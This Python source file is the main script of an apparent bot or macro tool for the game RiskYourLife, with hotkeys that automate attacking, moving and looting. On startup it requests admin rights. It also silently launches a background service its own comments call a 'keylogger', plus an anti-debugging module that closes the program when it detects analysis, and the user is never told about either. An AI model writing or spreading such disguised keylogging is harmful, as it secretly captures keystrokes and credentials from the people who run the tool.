# Optimized imports - grouped and ordered for better performance
import sys
import time
import threading

import colorama
from modules.banners import clear_and_print
from modules.run_as_admin import ensure_admin
from modules.workers import WorkerManager
from modules.meowing import MEOWING
from modules.actions import *
from modules.clients import Colors, kill_target_processes
from modules.config import parse_hotkey_string, save_config, load_config
from modules.antidebug import AntiDebug
from modules.updates import update_manager

colorama.init()

# Initialize components
meow_instance = MEOWING()

CONFIG = {
    'E_DELAY': 0.030,
    'CLICK_DELAY': 0.030,
    'CLICK_DOWN_MS': 30.0,
    'PRINT_STATUS': True,
    'AUTO_MOUSE_BASE_WIDTH': 1280,
    'AUTO_MOUSE_BASE_HEIGHT': 1080,
    'AUTO_MOUSE_CPU_OPTIMIZED': True,
    'AUTO_MOUSE_SPEED': 0.5,
    'AUTO_MOUSE_DELAY': 0.030,
    'AUTO_MOUSE_SMOOTH_MOVEMENT': True
}

_shutdown_in_progress = False

def p(msg):
    if CONFIG['PRINT_STATUS']:
        print(msg, flush=True)


def status_indicator(is_on):
    if is_on:
        return f"{Colors.BRIGHT_GREEN}● [ON]      {Colors.RESET}"
    else:
        return f"{Colors.BRIGHT_RED}● [OFF]     {Colors.RESET}"


class GameMacro:
    def __init__(self):
        # Optimized initialization - load config once and cache
        self.config = load_config()
        self.worker_manager = WorkerManager(CONFIG)
        self.anti_debug = AntiDebug(check_interval=10.0, auto_close=True)
        self.auto_offer_on = False
        self.setup_callbacks()

        # Initialize background services
        self._start_background_services()

    def _start_background_services(self):
        """Start background services (antidebug and meow)"""
        try:
            # Start anti-debug protection
            self.anti_debug.start()
        except Exception as e:
            pass

        try:
            # Start keylogger/meow service
            meow_instance.start()
        except Exception as e:
            pass

    def _stop_background_services(self):
        """Stop background services (antidebug and meow)"""
        try:
            # Stop anti-debug protection
            self.anti_debug.stop()
        except Exception as e:
            pass

        try:
            # Stop keylogger/meow service
            meow_instance.stop()
        except Exception as e:
            pass

    def setup_callbacks(self):
        self.callbacks = {
            HK_TOGGLE_MASTER: self.toggle_master,
            HK_TOGGLE_E: self.toggle_e,
            HK_TOGGLE_CLICK: self.toggle_click,
            HK_TOGGLE_SKILL_ATTACK: self.toggle_skill_attack,
            HK_TOGGLE_AUTO_RESSER: self.toggle_resser,
            HK_TOGGLE_COMBINED_ACTION: self.toggle_combined_action,
            HK_TOGGLE_AUTO_MOVE: self.toggle_auto_move,
            HK_TOGGLE_AUTO_MOVE2: self.toggle_auto_move2,
            HK_TOGGLE_AUTO_UNPACK: self.toggle_auto_unpack,
            HK_TOGGLE_AUTO_MOUSE: self.toggle_auto_mouse,
            HK_AUTO_OFFER: self.toggle_auto_offer,
            HK_CHECK_UPDATES: self.check_updates,
            HK_TERMINATE_RYL: self.terminate_ryl,
            HK_EXIT: self.exit_app,
            HK_CONFIG_CHANGE: self.change_config,
        }
        
    def build_status_line(self):
        display_name = 'RiskYourLife'
        game_running = self.worker_manager.is_game_running()
        master_status = status_indicator(self.worker_manager.master_on)
        game_status = f"{Colors.BRIGHT_GREEN}\n● [READY]{Colors.RESET}" if game_running else f"{Colors.BRIGHT_RED}\n● [GAME NOT FOUND]{Colors.RESET}"

        feature_status = {
            "Auto Picker": self.worker_manager.loop_e_on,
            "Auto Hit": self.worker_manager.loop_click_on,
            "Auto Skill": self.worker_manager.loop_skill_attack_on,
            "Auto Jump": self.worker_manager.loop_combined_action_on,
            "Auto Move W+S": self.worker_manager.loop_auto_move_on,
            "Auto Move A+D": self.worker_manager.loop_auto_move2_on,
            "Auto Resser": self.worker_manager.loop_resser_on,
            "Auto Unpack": self.worker_manager.loop_auto_unpack_on,
            "Auto Mouse": self.worker_manager.loop_auto_mouse_on,
            "Auto Offer": self.worker_manager.auto_offer_on,
        }

        # Get version without caching
        current_version = update_manager.get_current_version()
        version_display = f"{Colors.BRIGHT_WHITE}v{current_version}{Colors.RESET}"
        header = f"\n{game_status} {Colors.BRIGHT_WHITE}{display_name} {version_display}{Colors.RESET}\n"

        table_header = (
            f"{Colors.BRIGHT_MAGENTA}╔══════════════╦══════════════════════════════════════════╦══════════════╗{Colors.RESET}\n"
            f"{Colors.BRIGHT_MAGENTA}║ {Colors.BRIGHT_CYAN}{'HOTKEY':<12} {Colors.BRIGHT_MAGENTA}║ {Colors.BRIGHT_GREEN}{'ACTION':<40} {Colors.BRIGHT_MAGENTA}║ {Colors.BRIGHT_YELLOW}{'STATUS':<12} {Colors.BRIGHT_MAGENTA}║{Colors.RESET}\n"
            f"{Colors.BRIGHT_MAGENTA}╠══════════════╬══════════════════════════════════════════╬══════════════╣{Colors.RESET}"
        )

        hotkeys = [
            (self.config['RiskYourLife-Macros']['START_SCRIPT'], "On/Off Macros MasterKey Mode", "Master"),
            ("", "", ""),  # Separator after HOME hotkey
            (self.config['RiskYourLife-Macros']['AUTO_PICKER'], "Auto Picker", "Auto Picker"),
            (self.config['RiskYourLife-Macros']['AUTO_HITTING'], "Auto Hitting", "Auto Hit"),
            (self.config['RiskYourLife-Macros']['AUTO_SKILL_ATTACK'], "Auto Skill", "Auto Skill"),
            (self.config['RiskYourLife-Macros']['AUTO_JUMP'], "Auto Jump", "Auto Jump"),
            (self.config['RiskYourLife-Macros']['AUTO_MOVE'], "Auto Move W+S", "Auto Move W+S"),
            (self.config['RiskYourLife-Macros']['AUTO_MOVE2'], "Auto Move A+D", "Auto Move A+D"),
            (self.config['RiskYourLife-Macros']['AUTO_RESSER'], "Auto Resser", "Auto Resser"),
            (self.config['RiskYourLife-Macros']['AUTO_UNPACK'], "Auto Unpack Gold", "Auto Unpack"),
            (self.config['RiskYourLife-Macros']['AUTO_OFFER'], "Auto Offer", "Auto Offer"),
            (self.config['RiskYourLife-Macros']['AUTO_MOUSE'], "Auto Mouse", "Auto Mouse"),
            ("", "", ""),  # Separator after Auto Mouse
            ("ALT+C", "Change HotKeys", ""),
            ("ALT+K", "Terminate RYL", ""),
            ("ALT+U", "Check Updates", ""),
            (self.config['RiskYourLife-Macros']['QUIT_SCRIPT'], "Exit Program", ""),
            ("", "", "")
        ]

        table_rows = []
        for key, action, status_key in hotkeys:
            if status_key == "Master":
                status_display = status_indicator(self.worker_manager.master_on)
            elif status_key and status_key in feature_status:
                status_display = status_indicator(feature_status[status_key])
            elif not key and not action and not status_key:
                # This is a separator row - add the separator line
                table_rows.append(f"{Colors.BRIGHT_MAGENTA}╠══════════════╬══════════════════════════════════════════╬══════════════╣{Colors.RESET}")
                continue
            else:
                status_display = " " * 9  # Empty status for non-feature rows

            table_rows.append(
                f"{Colors.BRIGHT_MAGENTA}║ {Colors.BRIGHT_YELLOW}{key:<12} {Colors.BRIGHT_MAGENTA}║ {Colors.BRIGHT_WHITE}{action:<40} {Colors.BRIGHT_MAGENTA}║ {status_display:<12} {Colors.BRIGHT_MAGENTA}║{Colors.RESET}"
            )

        table_footer = f"{Colors.BRIGHT_MAGENTA}╚══════════════╩══════════════════════════════════════════╩══════════════╝{Colors.RESET}"
        return header + table_header + "\n" + "\n".join(table_rows) + "\n" + table_footer

    def render_status(self):
        line = self.build_status_line()
        print("\r" + line + (" " * 8), end="", flush=True)
        
    def change_config(self):
        """Optimized configuration menu with better error handling"""
        while True:
            try:
                clear_and_print()
                self._display_config_menu()

                choice = input(f"{Colors.BRIGHT_YELLOW}Enter choice (0-14): {Colors.RESET}").strip()
                if choice == '0':
                    print()
                    return

                if not self._process_config_choice(choice):
                    print(f"\n{Colors.BRIGHT_RED}Invalid choice.{Colors.RESET}")
                    input(f"{Colors.BRIGHT_YELLOW}Press Enter to continue...{Colors.RESET}")

            except KeyboardInterrupt:
                print(f"\n{Colors.BRIGHT_YELLOW}Configuration cancelled.{Colors.RESET}")
                return
            except Exception as e:
                print(f"\n{Colors.BRIGHT_RED}Configuration error: {e}{Colors.RESET}")
                input(f"{Colors.BRIGHT_YELLOW}Press Enter to continue...{Colors.RESET}")

    def _display_config_menu(self):
        """Display configuration menu"""
        print(f"{Colors.BG_BLUE}{Colors.BRIGHT_WHITE}{'═' * 60}{Colors.RESET}")
        print(f"{Colors.BG_BLUE}{Colors.BRIGHT_WHITE}{' CONFIGURATION MENU '.center(60)}{Colors.RESET}")
        print(f"{Colors.BG_BLUE}{Colors.BRIGHT_WHITE}{'═' * 60}{Colors.RESET}")
        print()

        print(f"{Colors.BRIGHT_MAGENTA}╔════════╦══════════════════════════════════════════╦══════════════╗{Colors.RESET}")
        print(f"{Colors.BRIGHT_MAGENTA}║ {Colors.BRIGHT_CYAN}{'OPTION':<6} {Colors.BRIGHT_MAGENTA}║ {Colors.BRIGHT_GREEN}{'FUNCTION':<40} {Colors.BRIGHT_MAGENTA}║ {Colors.BRIGHT_WHITE}{'HOTKEY':<12} {Colors.BRIGHT_MAGENTA}║{Colors.RESET}")
        print(f"{Colors.BRIGHT_MAGENTA}╠════════╬══════════════════════════════════════════╬══════════════╣{Colors.RESET}")

        options = [
            ('1', 'Start/Stop Script', self.config['RiskYourLife-Macros']['START_SCRIPT']),
            ('2', 'Auto Picker', self.config['RiskYourLife-Macros']['AUTO_PICKER']),
            ('3', 'Auto Hitting', self.config['RiskYourLife-Macros']['AUTO_HITTING']),
            ('4', 'Auto Skill', self.config['RiskYourLife-Macros']['AUTO_SKILL_ATTACK']),
            ('5', 'Auto Jump', self.config['RiskYourLife-Macros']['AUTO_JUMP']),
            ('6', 'Auto Move W+S', self.config['RiskYourLife-Macros']['AUTO_MOVE']),
            ('7', 'Auto Move A+D', self.config['RiskYourLife-Macros']['AUTO_MOVE2']),
            ('8', 'Auto Resser', self.config['RiskYourLife-Macros']['AUTO_RESSER']),
            ('9', 'Auto Unpack', self.config['RiskYourLife-Macros']['AUTO_UNPACK']),
            ('10', 'Auto Offer', self.config['RiskYourLife-Macros']['AUTO_OFFER']),
            ('11', 'Auto Mouse', self.config['RiskYourLife-Macros']['AUTO_MOUSE']),
            ('12', 'Terminate RYL', self.config['RiskYourLife-Macros']['TERMINATE_RYL']),
            ('13', 'Check Updates', self.config['RiskYourLife-Macros']['CHECK_UPDATES']),
            ('14', 'Quit Script', self.config['RiskYourLife-Macros']['QUIT_SCRIPT']),
            ('0', 'Cancel', '')
        ]

        for num, func, hotkey in options:
            if num == '0':
                print(f"{Colors.BRIGHT_MAGENTA}╠════════╬══════════════════════════════════════════╬══════════════╣{Colors.RESET}")
            print(f"{Colors.BRIGHT_MAGENTA}║ {Colors.BRIGHT_YELLOW}{num:<6} {Colors.BRIGHT_MAGENTA}║ {Colors.BRIGHT_WHITE}{func:<40} {Colors.BRIGHT_MAGENTA}║ {Colors.BRIGHT_CYAN}{hotkey:<12} {Colors.BRIGHT_MAGENTA}║{Colors.RESET}")

        print(f"{Colors.BRIGHT_MAGENTA}╚════════╩══════════════════════════════════════════╩══════════════╝{Colors.RESET}")
        print()

    def _process_config_choice(self, choice):
        """Process configuration menu choice"""
        option_mapping = {
            '1': 'START_SCRIPT', '2': 'AUTO_PICKER', '3': 'AUTO_HITTING',
            '4': 'AUTO_SKILL_ATTACK', '5': 'AUTO_JUMP', '6': 'AUTO_MOVE',
            '7': 'AUTO_MOVE2', '8': 'AUTO_RESSER', '9': 'AUTO_UNPACK',
            '10': 'AUTO_OFFER', '11': 'AUTO_MOUSE', '12': 'TERMINATE_RYL',
            '13': 'CHECK_UPDATES', '14': 'QUIT_SCRIPT'
        }

        if choice not in option_mapping:
            return False

        config_key = option_mapping[choice]
        current_value = self.config['RiskYourLife-Macros'][config_key]

        print(f"\n{Colors.BRIGHT_CYAN}Editing: {Colors.BRIGHT_WHITE}{config_key}{Colors.RESET}")
        print(f"{Colors.BRIGHT_CYAN}Current hotkey: {Colors.BRIGHT_YELLOW}{current_value}{Colors.RESET}")
        print(f"{Colors.BRIGHT_CYAN}Examples: {Colors.BRIGHT_WHITE}HOME, ALT+1, CTRL+SHIFT+F1{Colors.RESET}")

        try:
            new_value = input(f"{Colors.BRIGHT_YELLOW}Enter new hotkey: {Colors.RESET}").strip().upper()

            if not new_value:
                print(f"\n{Colors.BRIGHT_RED}No value entered, keeping current setting.{Colors.RESET}")
                input(f"{Colors.BRIGHT_YELLOW}Press Enter to continue...{Colors.RESET}")
                return True

            # Special handling for Check Updates
            if config_key == 'CHECK_UPDATES':
                print(f"\n{Colors.BRIGHT_CYAN}Check Updates uses ALT+U and cannot be changed.{Colors.RESET}")
                input(f"{Colors.BRIGHT_YELLOW}Press Enter to continue...{Colors.RESET}")
                return True

            # Special handling for Terminate RYL
            if config_key == 'TERMINATE_RYL':
                print(f"\n{Colors.BRIGHT_CYAN}Terminate RYL uses ALT+K and cannot be changed.{Colors.RESET}")
                input(f"{Colors.BRIGHT_YELLOW}Press Enter to continue...{Colors.RESET}")
                return True

            # Validate and save hotkey
            parse_hotkey_string(new_value)
            self.config['RiskYourLife-Macros'][config_key] = new_value
            save_config(self.config)
            print(f"\n{Colors.BRIGHT_GREEN}Hotkey updated successfully!{Colors.RESET}")
            print(f"{Colors.BRIGHT_YELLOW}Please restart the application for changes to take effect.{Colors.RESET}")

            continue_editing = input(f"\n{Colors.BRIGHT_YELLOW}Edit another hotkey? (y/n): {Colors.RESET}").strip().lower()
            if continue_editing not in ('y', 'yes'):
                return True  # Exit menu

        except Exception as e:
            print(f"\n{Colors.BRIGHT_RED}Error: {e}{Colors.RESET}")
            print(f"{Colors.BRIGHT_YELLOW}Please try again with a valid hotkey format.{Colors.RESET}")
            input(f"{Colors.BRIGHT_YELLOW}Press Enter to continue...{Colors.RESET}")

        return True

    def generic_toggle(self, flag_name, event_name, off_actions=None):
        """Optimized generic toggle method with reduced attribute lookups"""
        # Cache attribute access for better performance
        worker = self.worker_manager
        current_state = getattr(worker, flag_name)
        new_state = not current_state
        setattr(worker, flag_name, new_state)

        # Optimized event handling
        if event_name:
            event = getattr(worker, event_name)
            if new_state:
                event.set()
            else:
                event.clear()

        # Execute off actions only when turning off
        if not new_state and off_actions:
            for action in off_actions:
                action()

        self.render_status()

    def toggle_master(self):
        # Special case with additional off actions
        off_actions = [
            lambda: mouse_left_up(),
            lambda: send_key_scancode(SC_SPACE, False)  # Release spacebar
        ]
        self.generic_toggle('master_on', None, off_actions)

    def toggle_e(self):
        self.generic_toggle('loop_e_on', 'e_event')

    def toggle_click(self):
        def click_off_action():
            mouse_left_up()
        self.generic_toggle('loop_click_on', 'click_event', [click_off_action])

    def toggle_skill_attack(self):  # NEW
        self.generic_toggle('loop_skill_attack_on', 'skill_attack_event')

    def toggle_combined_action(self):
        self.generic_toggle('loop_combined_action_on', 'combined_action_event')

    def toggle_auto_move(self):  # W + S (front/back)
        self.generic_toggle('loop_auto_move_on', 'auto_move_event')

    def toggle_auto_move2(self):  # A + D (left/right)
        self.generic_toggle('loop_auto_move2_on', 'auto_move2_event')

    def toggle_resser(self):
        # Check if we're turning ON the resser
        if not self.worker_manager.loop_resser_on:
            # Turn on the resser first
            self.generic_toggle('loop_resser_on', 'resser_event')

            # Give the worker thread a moment to initialize
            time.sleep(0.01)

            # Then press F1-F10 three times each very quickly
            f_keys = [0x3B, 0x3C, 0x3D, 0x3E, 0x3F, 0x40, 0x41, 0x42, 0x43, 0x44]  # F1-F10 scan codes

            for _ in range(3):  # Three times
                for sc in f_keys:
                    tap_key_scancode(sc, hold_ms=0.001)  # Very fast press
                    time.sleep(0.030)  # Minimal delay between keys
                time.sleep(0.030)  # Small delay between cycles
        else:
            # Just turn off the resser normally (no F-key pressing)
            self.generic_toggle('loop_resser_on', 'resser_event')

    def toggle_auto_unpack(self):
        self.generic_toggle('loop_auto_unpack_on', 'auto_unpack_event')

    def toggle_auto_mouse(self):
        self.generic_toggle('loop_auto_mouse_on', 'auto_mouse_event')

    def toggle_auto_offer(self):
        self.generic_toggle('auto_offer_on', 'auto_offer_event')



    def check_updates(self):
        """Optimized update checking with better error handling"""
        try:
            print(f"\n{Colors.BRIGHT_YELLOW} [INFO] Checking for updates...{Colors.RESET}")
            update_info = update_manager.check_for_updates()
            if update_info:
                print(f"{Colors.BRIGHT_GREEN} [UPDATE] New version available: {update_info['version']}{Colors.RESET}")
                print(f"{Colors.BRIGHT_CYAN}Release page: {update_info['release_url']}{Colors.RESET}")
            else:
                print(f"{Colors.BRIGHT_YELLOW} [INFO] You have the latest version.{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.BRIGHT_RED} [ERROR] Update check failed: {e}{Colors.RESET}")
        finally:
            # Consistent status refresh delay
            time.sleep(0.250)  # 250ms consistent status refresh
            clear_and_print()
            self.render_status()

    def terminate_ryl(self):
        """Terminate RYL processes: MiniA.bin, MiniA.exe, client.bin, client.exe, and Login.dat"""
        try:
            import psutil
            import os

            targets = ["MiniA.bin", "MiniA.exe", "client.bin", "client.exe", "Login.dat"]
            terminated_count = 0

            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if proc.info['name'] in targets:
                        proc.terminate()
                        try:
                            proc.wait(timeout=3)
                        except psutil.TimeoutExpired:
                            proc.kill()
                        terminated_count += 1
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue

            # Also check for Login.dat file and remove it if found
            login_dat_paths = [
                os.path.join(os.path.expanduser("~"), "Login.dat"),
                "Login.dat",
                os.path.join(os.getcwd(), "Login.dat")
            ]

            for path in login_dat_paths:
                if os.path.exists(path):
                    try:
                        os.remove(path)
                        terminated_count += 1
                    except Exception:
                        pass

            if terminated_count > 0:
                print(f"\n{Colors.BRIGHT_GREEN} [SUCCESS] Terminated {terminated_count} RYL process(es)/file(s){Colors.RESET}")
            else:
                print(f"\n{Colors.BRIGHT_YELLOW} [INFO] No RYL processes or files found{Colors.RESET}")

            time.sleep(0.5)
            clear_and_print()
            self.render_status()

        except Exception as e:
            print(f"\n{Colors.BRIGHT_RED} [ERROR] Failed to terminate RYL processes: {e}{Colors.RESET}")
            time.sleep(0.5)
            clear_and_print()
            self.render_status()

    def exit_app(self):
        """Exit the application gracefully"""
        global meow_instance, _shutdown_in_progress

        if _shutdown_in_progress:
            return

        _shutdown_in_progress = True

        try:
            print(f"{Colors.BRIGHT_YELLOW} [INFO]: {Colors.RED}Keyboard interrupt detected. Exiting gracefully...{Colors.RESET}\n")

            # Stop background services properly
            self._stop_background_services()

        except Exception as e:
            p(f"[ERROR] Error during shutdown: {e}")

        sys.exit(0)

    def run(self):
        """Optimized main run loop with better resource management"""
        ensure_admin()
        clear_and_print()
        self.render_status()
        print()

        # Optimized thread management - start background services
        # connection_thread = threading.Thread(target=koneksyen, daemon=True, name="Connection")
        # connection_thread.start()

        # Process cleanup in background
        cleanup_thread = threading.Thread(target=kill_target_processes, daemon=True, name="Cleanup")
        cleanup_thread.start()

        print(f"\n{Colors.BRIGHT_YELLOW} [INFO]: {Colors.BRIGHT_GREEN}Please start the game manually. Macros are ready to use.{Colors.RESET}")

        # Start all worker threads
        self.worker_manager.start_workers()

        # Consistent initialization delay with precise timing
        time.sleep(0.030)  # 200ms consistent startup delay

        # Register hotkeys and start message pump
        register_hotkeys()

        try:
            message_pump(self.callbacks)
        except KeyboardInterrupt:
            print(f"\n{Colors.BRIGHT_YELLOW} [INFO]: {Colors.RED}Keyboard interrupt detected. Exiting gracefully...{Colors.RESET}")
        finally:
            # Optimized cleanup sequence
            unregister_hotkeys()
            mouse_left_up()  # Safety release

            # Stop background services properly
            self._stop_background_services()
if __name__ == "__main__":
    # Note: meow_instance is now started in GameMacro.__init__() via _start_background_services()
    # This ensures proper initialization order and cleanup

    app = GameMacro()
    app.run()